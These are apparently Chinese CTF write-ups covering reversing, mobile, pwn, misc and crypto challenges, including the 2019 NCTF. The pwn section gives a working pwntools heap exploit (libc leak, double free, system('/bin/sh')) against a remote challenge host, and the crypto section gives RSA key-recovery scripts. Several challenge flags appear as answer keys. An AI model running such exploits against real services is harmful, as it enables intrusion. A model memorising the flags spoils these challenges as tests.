<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> base64</span></span><br><span class="line"><span class="function">def <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line"><span class="function">    s </span>= <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;eYNzc2tjWV1gXFWPYGlTbQ==&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">print <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="function"><span class="keyword">if</span> <span class="title">encode</span><span class="params">(flag)</span> </span>== correct:</span><br><span class="line">    print <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这就很棒了<br>源码都有了  什么是逆不出来的<br>这里需要注意一下的是correct的内容最好不要用网上的Base64解码工具解码<br>最好用Python的base64模块解码<br>简单写一下Python得到decode后的字符串</p>
<p> y\x83sskcY]<code>\\U\x8f</code>iSm</p>
<p>然后写一个脚本，跑一下就出来了<br>脚本如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">512</span>]=<span class="string">&quot;y\x83sskcY]`\\U\x8f`iSm&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;strlen(buffer);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buffer[i]-=<span class="number">16</span>;</span><br><span class="line">        buffer[i]^=<span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;strlen(buffer);i++)</span><br><span class="line">        cout&lt;&lt;buffer[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-Rev04"><a href="#5-Rev04" class="headerlink" title="5.Rev04"></a>5.Rev04</h2><p>拉入od提示文件损坏，去百度elf文件的格式，发现其格式不固定，格式基本固定的地方又没有发现有什么明显的错误，但是记事本打开查看内容时发现一串极为可疑的字符：<br>​​<img src="https://img-blog.csdnimg.cn/20190525102411603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>数了下长度，符合base64加密的密文长度，base64转码，果然有问题：</p>
<p> uggc://VFPP2019{hey_frrzf_ebggra_jvgu}pgs.pbz</p>
<p>显然是flag密文，多次解密尝试后发现是rot13加密，在线解rot13即可</p>
<h2 id="6-Rev02"><a href="#6-Rev02" class="headerlink" title="6.Rev02"></a>6.Rev02</h2><h2 id="7-Rev01"><a href="#7-Rev01" class="headerlink" title="7.Rev01"></a>7.Rev01</h2><p>这是一个rust逆向。载入ida分析<br>​​<img src="https://img-blog.csdnimg.cn/20190525102439742.png" alt="在这里插入图片描述"><br>需要留意，rust语言写出来的程序其主函数为“beginer_reverse::main::……..”，所以对main反编译是找不到正确的东西的。<br>​​<img src="https://img-blog.csdnimg.cn/20190525102446323.png" alt="在这里插入图片描述"><br>进入之后即看到一串明显像是密文的东西。向下翻找到唯一一个具备加密转码性质的代码<br>​​<img src="https://img-blog.csdnimg.cn/20190525102451414.png" alt="在这里插入图片描述"><br>其中 v33 恰是开头的v0，很明显就是将上面的内容转码后和输入进行比对，仔细审计中间的代码会发现v15对应的是输入。写出解密脚本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#coding=utf-<span class="number">8</span></span><br><span class="line">cipher = [<span class="number">0x00000154</span>,<span class="number">0x00000180</span>,<span class="number">0x000001FC</span>,<span class="number">0x000001E4</span>,<span class="number">0x000001F8</span>,<span class="number">0x00000154</span>,<span class="number">0x00000190</span>,<span class="number">0x000001BC</span>,<span class="number">0x00001BC</span>,<span class="number">0x000001B8</span>,<span class="number">0x00000154</span>,<span class="number">0x000001F8</span>,<span class="number">0x0000194</span>,<span class="number">0x00000154</span>,<span class="number">0x000001B4</span>,<span class="number">0x000001BC</span>,<span class="number">0x00001F8</span>,<span class="number">0x00000154</span>,<span class="number">0x000001F4</span>,<span class="number">0x00000188</span>,<span class="number">0x00001AC</span>,<span class="number">0x000001F8</span>,<span class="number">0x00000154</span>,<span class="number">0x0000018C</span>,<span class="number">0x00001E4</span>,<span class="number">0x00000154</span>,<span class="number">0x00000190</span>,<span class="number">0x000001BC</span>,<span class="number">0x154</span>,<span class="number">0x90</span>]</span><br><span class="line">#以上数据经过转码后拿到数据要进行一次ascii码转换，但是第一次转出来的是str类型下的数字，不能直接输出ascii码对应的字符，所以需要用chr()处理一下</span><br><span class="line">cipher2=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(len(cipher)</span>):</span></span><br><span class="line"><span class="function">    cipher2+</span>=chr((cipher[i]&gt;&gt;<span class="number">2</span>)^<span class="number">0xA</span>)</span><br><span class="line">print cipher2</span><br><span class="line">#也可以用一个直接点的代码处理</span><br><span class="line">cipher1 = <span class="string">&#x27;&#x27;</span>.join(map(lambda x: chr((x&gt;&gt;<span class="number">2</span>) ^ <span class="number">0xa</span>), cipher))</span><br><span class="line">print cipher1</span><br></pre></td></tr></table></figure>
<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Mobile01"><a href="#Mobile01" class="headerlink" title="Mobile01"></a>Mobile01</h2><p>使用jeb查看反汇编代码，发现有两个关键函数 checkFrist 和 checkSecond<br>checkFrist查看其内部内容发现是检查输入字符串，要求字符串长度为16位，范围在1到8之间<br>checkSecond在Native层里面，调用的是c/c++代码，jeb中无法查看，用ida打开apk包里面的lib下的so文件（ida需要加载jni模块，不然反汇编的代码相对会比较复杂，不利于逆向分析）。<br>发现checksecond函数中要求前八位必须是递增关系，即前八位为“12345678”<br>后八位则给了相关约束条件，写一个脚本跑一下即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#调用z3求解器</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time      <span class="comment">#记录计算时间用，舍弃也可以</span></span><br><span class="line">t1=time.time()   <span class="comment">#记录计算时间用，舍弃也可以</span></span><br><span class="line"><span class="comment">#设一个解决样例</span></span><br><span class="line">solver=Solver()</span><br><span class="line"><span class="comment">#设置样例flag长度</span></span><br><span class="line">flag=[Int(<span class="string">&#x27;flag%d&#x27;</span>%i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"><span class="comment">#给flag的每一位添加范围约束（0，9）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    solver.add(flag[i]&gt;<span class="number">0</span>)</span><br><span class="line">    solver.add(flag[i]&lt;<span class="number">9</span>)</span><br><span class="line"><span class="comment">#设置样例flag前八位数值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    solver.add(flag[i]==i+<span class="number">1</span>)</span><br><span class="line"><span class="comment">#添加逆向分析时得到的条件约束</span></span><br><span class="line">solver.add(flag[<span class="number">9</span>]+flag[<span class="number">14</span>]==<span class="number">14</span>)</span><br><span class="line">solver.add(flag[<span class="number">8</span>]&lt;=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=j):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        solver.add(flag[k]!=flag[j])</span><br><span class="line">        solver.add(flag[k+<span class="number">8</span>]!=flag[j+<span class="number">8</span>])</span><br><span class="line">        solver.add((flag[j]-flag[k])!=(flag[j+<span class="number">8</span>]-flag[k+<span class="number">8</span>]))</span><br><span class="line">        solver.add((flag[j]-flag[k])!=(flag[k+<span class="number">8</span>]-flag[j+<span class="number">8</span>]))</span><br><span class="line"><span class="comment">#这个检查应该是判断是否有解，有则输出flag，无则报错</span></span><br><span class="line"><span class="keyword">if</span>(solver.check()==sat):</span><br><span class="line">    m=solver.model()</span><br><span class="line">    s=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        s.append(m[flag[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">t2=time.time()</span><br><span class="line"><span class="built_in">print</span>(t2-t1)</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="1-Pwn01"><a href="#1-Pwn01" class="headerlink" title="1.Pwn01"></a>1.Pwn01</h2><h2 id="2-Pwn02"><a href="#2-Pwn02" class="headerlink" title="2.Pwn02"></a>2.Pwn02</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">IP = <span class="string">&#x27;39.100.87.24&#x27;</span></span><br><span class="line">PORT = 8102LOCAL = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    sh = process(<span class="string">&#x27;./pwn02&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">idx, size, ctx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1 &#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendline(ctx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2 &#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3 &#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">&quot;aa&quot;</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">malloc(<span class="number">2</span>, <span class="number">0x58</span>, <span class="string">&quot;cc&quot;</span>)</span><br><span class="line">malloc(<span class="number">3</span>, <span class="number">0x80</span>, <span class="string">&quot;dd&quot;</span>)</span><br><span class="line">malloc(<span class="number">4</span>, <span class="number">0x10</span>, <span class="string">&quot;ee&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin leak</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">puts(<span class="number">3</span>)</span><br><span class="line">leak = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">leak = u64(leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    libc_base = leak-<span class="number">3951480</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_base = leak-<span class="number">3951480</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu 1604 server</span></span><br><span class="line">log.success(<span class="string">&quot;libc base: %s&quot;</span> %<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;f&quot;</span>*<span class="number">80</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0x600dba</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">5</span>, <span class="number">0x58</span>, payload)</span><br><span class="line">malloc(<span class="number">6</span>, <span class="number">0x58</span>, <span class="string">&quot;gg&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line">payload = <span class="string">&quot;h&quot;</span>* <span class="number">6</span> + p64(system)*<span class="number">2</span></span><br><span class="line">malloc(<span class="number">7</span>, <span class="number">0x58</span>, payload)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">8</span>, <span class="number">0x20</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2019NCTF(some)</title>
    <url>/2019/11/25/NCTF(some)/</url>
    <content><![CDATA[<h1 id="2019-NCTF"><a href="#2019-NCTF" class="headerlink" title="2019-NCTF"></a>2019-NCTF</h1><p>是什么压垮了我的身躯，是沉重的专业课作业！！！这次比赛的时间刚好要我这个萌新肝作业，本来就菜，还遭遇如此变故，太难了。。。只来得及看了一点点题目时间就不够用了，唉，叭说了</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>做个问卷，无坑，还以为会在问卷里面遇到什么坑呢</p>
<h3 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h3><p>这个题一开始没反应过来，作业使我僵化emmm</p>
<p>用<code>pip install --user 2019xxxxxx</code>的命令安装pip库之后去查看该库的文件，只有安装记录和一个py脚本，内容是flag已经在本地了。</p>
<p>想到应该是安装脚本有东西，wget下载库包，直接查看其中的<code>setup.py</code>，发现东西</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path, system</span><br><span class="line"></span><br><span class="line">tmp_file = tempfile.gettempdir() + path.sep + <span class="string">&#x27;.f14g_is_here&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(tmp_file, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&#x27;TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>它在本地临时文件夹留下了<code>.f14g_is_here</code>，内容为<code>TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9</code>，直觉base64。</p>
<h3 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h3><p>直接改后缀解压缩，拿到俩张图一个hint</p>
<p>hint：寻找像素中的秘密</p>
<p>一开始以为是盲水印，发现没东西，用Stegsolve.jar对比俩张图也没东西，最后想到好久没见过的容差对比，用Beyond_Compare加载俩张图片直接看到二维码，扫码得flag</p>
<h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>winhex查看，发现结尾数据不是图片结尾，是word文档，搜索<code>FFD9</code>，从图片数据结尾处手动提取出word数据保存出来。打开发现只有一句话，说有一串奇怪的字符，查看隐藏文字拿到该字符串</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125164149476.png" alt="image-20191125164149476" style="zoom:100%;" /></p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125164758131.png" alt="image-20191125164758131"></p>
<p>带特殊字符，长得像uu，一开始以为是uu，解不通，遂遍历各加密，其皆带殊字，无解，仅余base族未试，奈何需付费，终弃之。后经佬告知，python3.x的base64库带有base64以上的解密算法，可直接用。。。哭~~</p>
<p>最后用 python3 的 base85 解码得flag</p>
<h3 id="what‘s-this"><a href="#what‘s-this" class="headerlink" title="what‘s this"></a>what‘s this</h3><p>存在压缩包，导出，解压得到.txt文件。</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125195513454.png" alt="image-20191125195513454"></p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125195540251.png" alt="image-20191125195540251"></p>
<p>Base64隐写，跑一下脚本就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;What1s7his.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">str</span>+=j</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> base64.b64decode(<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(j)&lt;=<span class="number">126</span> <span class="keyword">and</span> <span class="built_in">ord</span>(j)&gt;=<span class="number">32</span>:</span><br><span class="line">            a+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span> base64.b64decode(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>​    ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</p>
<p>都是26键第一行字母，和上面数字对应</p>
<p>​    q-1    w-2    e-3    r-4    t-5    y-6    u-7    i-8    o-9    p-0</p>
<p>9键对应过去</p>
<p>y    999     o    666     u    88     a    2     r    777     e    33     s    7777     o    666     s    7777</p>
<p>m    6     a    2     r    777     t    8     t    8     h    44     a    2     t    8     t    8     h    44     i    444</p>
<p>s    7777     i    444    s    7777    j    5     u    88     s    7777     t    8     a    2     p    7     i    444</p>
<p>e    33     c    222     e    33     o    666     f    333     c    222     a    2     k    55     e    33</p>
<p>NCTF{youaresosmartthatthisisjustapieceofcake}</p>
<h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b=[]</span><br><span class="line">f=[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">61</span>,<span class="number">101</span>,<span class="number">33871</span>,<span class="number">91781</span>,<span class="number">112939</span>]</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">i,s</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">global</span> a</span><br><span class="line">        <span class="keyword">if</span>(s&lt;<span class="number">120000</span>):</span><br><span class="line">            b.append(s)</span><br><span class="line">            a +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(s*f[i]&lt;<span class="number">120000</span>):</span><br><span class="line">            b.append(s*f[i])</span><br><span class="line">            a +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dfs(i+<span class="number">1</span>,s)</span><br><span class="line">        dfs(i+<span class="number">1</span>,s*f[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextPrime</span>(<span class="params">n</span>):</span></span><br><span class="line">    n += <span class="number">2</span> <span class="keyword">if</span> n &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(n):</span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">x = e * d - <span class="number">1</span></span><br><span class="line">dfs(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">    xx = x // b[j]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">        xxx = xx + i * i</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(xxx,<span class="number">2</span>)[<span class="number">1</span>]==<span class="number">1</span>):</span><br><span class="line">            p=gmpy2.iroot(xxx,<span class="number">2</span>)[<span class="number">0</span>] - i + <span class="number">1</span></span><br><span class="line">q = nextPrime(p)</span><br><span class="line">n=p*q</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m_hex = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>((binascii.a2b_hex(m_hex)))</span><br></pre></td></tr></table></figure>
<h3 id="childyrsa"><a href="#childyrsa" class="headerlink" title="childyrsa"></a>childyrsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"></span><br><span class="line">n = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">c = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">sqr=<span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> sieve_base:</span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">​    i *=p</span><br><span class="line">​    <span class="keyword">if</span>(i&gt;sqr):</span><br><span class="line">​      <span class="keyword">break</span></span><br><span class="line">  a = a*i</span><br><span class="line"></span><br><span class="line">p=fractions.gcd(<span class="built_in">pow</span>(<span class="number">3</span>,a,n)-<span class="number">1</span>,n)</span><br><span class="line">q=n//p</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m_hex = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((binascii.a2b_hex(m_hex)))</span><br></pre></td></tr></table></figure>
<p>NCTF{Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3}</p>
<h3 id="sore"><a href="#sore" class="headerlink" title="sore"></a>sore</h3><p>Vigenere Cipher ，没跑出来</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>真就签到鸭</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125200000138.png" alt="image-20191125200000138"></p>
<p> 开头那个函数没啥用，<strong>sub_401340（&amp;v4）</strong>用到了我们的输入，进去发现是一堆方程</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125201907307.png" alt="image-20191125201907307"></p>
<p>方程的运算结果已给出，用z3跑一下就行</p>
